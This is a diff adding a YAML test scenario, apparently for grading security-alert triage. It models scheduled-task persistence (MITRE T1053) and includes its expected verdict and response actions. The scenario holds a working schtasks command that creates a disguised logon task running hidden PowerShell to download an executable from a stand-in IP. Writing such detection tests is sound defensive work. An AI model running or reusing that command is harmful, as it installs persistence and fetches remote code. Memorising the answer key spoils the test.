@@ -1,0 +1,13 @@
+id: schtask-persistence-01
+mitre: T1053
+description: A scheduled task on carol's workstation runs a hidden PowerShell download at every logon.
+events:
+  - event: {source: sysmon, event_id: 1, action: process_start, host: wks-carol-03, user: carol,
+            process: schtasks.exe, parent: cmd.exe,
+            cmd: 'schtasks.exe /create /tn "OneDriveUpdater" /tr "powershell -w hidden -c iwr http://198.51.100.23/u.exe -OutFile $env:TEMP\u.exe" /sc onlogon /f'}
+noise: {benign_processes: 120}
+noise_hosts: [wks-carol-03, wks-alice-01]
+expect:
+  verdict: malicious
+  actions: [firewall.block_ip, edr.remove_persistence, edr.isolate_host]
+  max_tier: 2
